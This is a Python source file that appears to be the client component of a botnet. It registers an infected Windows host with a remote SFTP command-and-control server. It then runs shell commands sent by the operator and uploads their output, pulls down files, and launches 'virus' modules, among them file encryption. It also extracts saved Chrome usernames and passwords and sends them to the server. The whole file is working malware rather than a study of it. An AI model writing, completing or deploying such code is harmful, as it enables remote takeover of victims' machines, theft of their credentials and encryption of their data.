import os
import time
import subprocess

from client import Client
from viruses import Viruses
from gather_info import GatherInfo
from custom_commands import CustomCommands
from chrome_passwords import chrome_passwords

class TaskHandler:
    def __init__(self, hostname, username, password):
        self.info = GatherInfo()
        self.client = Client(
            hostname,
            username,
            password
        )

        self.dirs = {
            "clients_num": "\clients_num.txt",
            "cmd": "\cmd.txt",
            "output": "\output.txt",
            "info": "\info.txt",
            "file_output": r"\file_output.txt",
            "online_msg": "\online.txt",
            "cmd_info": "\cmd_info.txt",
            "custom_output": "\custom_output.txt",
            "vir_info": r"\vir_info.txt",
            "vir_output": r"\vir_output.txt",
            "local_dir": fr"C:\Users\{self.info.username}\user_info"
        }

        if not os.path.isdir(self.dirs["local_dir"]):
            os.mkdir(self.dirs["local_dir"])

    def connect(self):
        self.client.connect()

    def get_client_name(self):
        with open(self.client_check, "r") as f:
            return f.read()

    def increment_client_count(self):
        sftp_client = self.client.client.open_sftp()
        num_dir = self.dirs["local_dir"] + self.dirs["clients_num"]

        sftp_client.get("/home/botnet/client/clients_num.txt", num_dir)

        with open(num_dir, "r+") as f:
            num = str(int(f.read().strip()[-1]) + 1)
            open(num_dir, "w").close()
            f.write(num + "\n")
        
        sftp_client.put(num_dir, "/home/botnet/client/clients_num.txt")
        os.remove(num_dir)

        return num, sftp_client

    def copy_file(self):
        self.client_check = self.dirs["local_dir"] + "\\.user_settings"
        if os.path.exists(self.client_check):
            print("Client already exists on server")
            return

        client_num, sftp_client = self.increment_client_count()
        client_name = f"CLIENT-{self.info.mac}-{client_num}.txt"
        client_dir = self.dirs["local_dir"] + "\\name.txt"
        client_copy = self.dirs["local_dir"] + "\\client_copy.txt"

        with open(client_dir, "w") as f:
            f.write(self.info.contents)
        open(client_copy, "w").close()

        sftp_client.put(client_dir, "/home/botnet/client/clients/" + client_name)
        sftp_client.put(client_copy, "/home/botnet/server/client_control/" + client_name)
        sftp_client.put(client_copy, "/home/botnet/server/sendfile/output/" + client_name)
        os.remove(client_dir)
        os.remove(client_copy)

        sftp_client.close()
        with open(self.client_check, "w") as f:
            f.write(client_name)

    def recv_shell(self):
        sftp_client = self.client.client.open_sftp()
        local_cmd_dir = self.dirs["local_dir"] + self.dirs["cmd"]
        output_dir = self.dirs["local_dir"] + self.dirs["output"]
        client_name = self.get_client_name()

        while True:
            try:
                sftp_client.get("/home/botnet/server/client_control/" + client_name, local_cmd_dir)
            except:
                os._exit(1)
            with open(local_cmd_dir, "r") as f:
                cmd = f.read()

                try:
                    # TODO: Remove print from recv_shell and recv_file and recv_custom_cmd
                    output = subprocess.check_output(cmd, universal_newlines=True)
                    print("Command Success")
                    with open(output_dir, "w") as f:
                        f.write(output)
                except Exception as e:
                    with open(output_dir, "w") as f:
                        f.write(str(e))
                    print(e)

            sftp_client.put(output_dir, "/home/botnet/server/client_output/" + client_name)
            time.sleep(2)
            open(output_dir, "w").close()
            sftp_client.put(output_dir, "/home/botnet/server/client_output/" + client_name)

            os.remove(output_dir)
            os.remove(local_cmd_dir)
            time.sleep(3)
    
    def recv_file(self):
        sftp_client = self.client.client.open_sftp()
        info_dir = self.dirs["local_dir"] + self.dirs["info"]
        file_output_dir = self.dirs["local_dir"] + self.dirs["file_output"]
        client_name = self.get_client_name()
        raw_name = client_name.split(".")[0]
        output_msg = "Successfully sent file to: " + raw_name

        print("Listening for file...")

        while True:
            try:
                sftp_client.get("/home/botnet/server/sendfile/file_info.txt", info_dir)
            except:
                continue

            with open(info_dir, "r") as f:
                info = f.readlines()
            if info[0].strip() != raw_name and info[0].strip() != "all":
                open(file_output_dir, "w").close()
                print("Wrong Sendfile Client")
                time.sleep(5)
                continue
            
            try:
                sftp_client.get("/home/botnet/server/sendfile/" + info[1].split("\\")[-1].strip(), info[1].strip())
                print("Success")
            except Exception as e:
                print(e)
                output_msg = "Failed to send file to: " + raw_name
            
            with open(file_output_dir, "w") as f:
                f.write(output_msg)

            sftp_client.put(file_output_dir, "/home/botnet/server/sendfile/output/" + client_name, confirm=False)
            os.remove(file_output_dir)
            os.remove(info_dir)
            time.sleep(5)
    
    def recv_custom_cmd(self):
        sftp_client = self.client.client.open_sftp()
        cmd_info = self.dirs["local_dir"] + self.dirs["cmd_info"]
        custom_output = self.dirs["local_dir"] + self.dirs["custom_output"]
        client_name = self.get_client_name()
        raw_name = client_name.split(".")[0]
        output_msg = "Successfully sent custom command to: " + raw_name

        print("Listening for custom command...")
        while True:
            try:
                sftp_client.get("/home/botnet/server/custom_cmd/cmd_info.txt", cmd_info)
                with open(cmd_info, "r") as f:
                    info = f.readlines()
                    target = info[0].strip()
                    cmd = info[1].strip()
                    cmd_split = cmd.split(" ")
            except:
                continue

            if target != raw_name and target != "all":
                print("Wrong Virus Client")
                time.sleep(5)
                continue
        
            try:
                custom_cmd = CustomCommands(cmd, cmd_split)
                output, method = custom_cmd.check_cmds()

                if output == 0:
                    if method == "ss":
                        sftp_client.put(cmd_split[1], "/home/botnet/server/" + cmd_split[1].split("\\")[-1])
                        os.remove(cmd_split[1])
            except Exception as e:
                output_msg = "Failed to send custom command to: " + raw_name
                print(e)

            with open(custom_output, "w") as f:
                f.write(output_msg)
            
            sftp_client.put(custom_output, "/home/botnet/server/custom_cmd/output/" + client_name, confirm=False)
            os.remove(cmd_info)
            os.remove(custom_output)
            time.sleep(5)

    def recv_virus(self):
        sftp_client = self.client.client.open_sftp()
        cmd_info = self.dirs["local_dir"] + self.dirs["vir_info"]
        custom_output = self.dirs["local_dir"] + self.dirs["vir_output"]
        client_name = self.get_client_name()
        raw_name = client_name.split(".")[0]
        output_msg = "Successfully sent virus command to: " + raw_name
        virus_object = []
        encryptions = {}

        print("Listening for virus...")
        while True:
            try:
                sftp_client.get("/home/botnet/server/vir/vir_info.txt", cmd_info)
                with open(cmd_info, "r") as f:
                    info = f.readlines()
                    target = info[0].strip()
                    cmd = info[1].strip()
                    cmd_split = cmd.split(" ")
            except:
                continue

            if target != raw_name and target != "all":
                print("Wrong Virus Client")
                time.sleep(5)
                continue
        
            try:
                viruses = Viruses(cmd, cmd_split)
                output, method = viruses.check_cmds()

                if output == 0:
                    if method == "soo":
                        virus_object.append(viruses)
                    if method == "si":
                        virus_object.append(viruses)
                    if method == "errwin":
                        virus_object.append(viruses)
                    if method == "dlp":
                        virus_object.append(viruses)
                    if method == "mw":
                        virus_object.append(viruses)
                    if method == "encrypt":
                        encryptions[cmd_split[1]] = viruses.fernet
                    if method == "decrypt":
                        if cmd_split[1] in encryptions:
                            viruses.decrypt(cmd_split[1], encryptions[cmd_split[1]])
                            del encryptions[cmd_split[1]]
                    if method == "chromepass":
                        output_msg += f"\n{'='*50}\n"
                        for x in chrome_passwords():
                            origin_url = x["origin_url"]
                            action_url = x["action_url"]
                            username = x["username"]
                            password = x["password"]
                            output_msg += f"Origin URL: {origin_url}\nAction URL: {action_url}\n" + \
                                          f"Username: {username}\nPassword: {password}\n{'='*50}\n"
                    if method == "stop":
                        for x in virus_object:
                            x.threads_on = False
                        virus_object = []
            except Exception as e:
                output_msg = "Failed to send virus to: " + raw_name
                print(e)

            with open(custom_output, "w") as f:
                f.write(output_msg)

            sftp_client.put(custom_output, "/home/botnet/server/vir/output/" + client_name, confirm=False)
            os.remove(cmd_info)
            os.remove(custom_output)
            time.sleep(5)

    def stay_online(self):
        sftp_client = self.client.client.open_sftp()
        online_msg = self.dirs["local_dir"] + self.dirs["online_msg"]
        client_name = self.get_client_name()

        while True:
            try:
                sftp_client.get("/home/botnet/server/online/" + client_name, online_msg)
            except:        
                open(online_msg, "w").close()

            with open(online_msg, "r+") as f:
                contents = f.read().strip().replace("\x00", "")
                if contents == "":
                    f.write("1")
                else:
                    open(online_msg, "w").close()
                    f.write(str(int(contents) + 1))

            sftp_client.put(online_msg, "/home/botnet/server/online/" + client_name)
            os.remove(online_msg)
            time.sleep(5)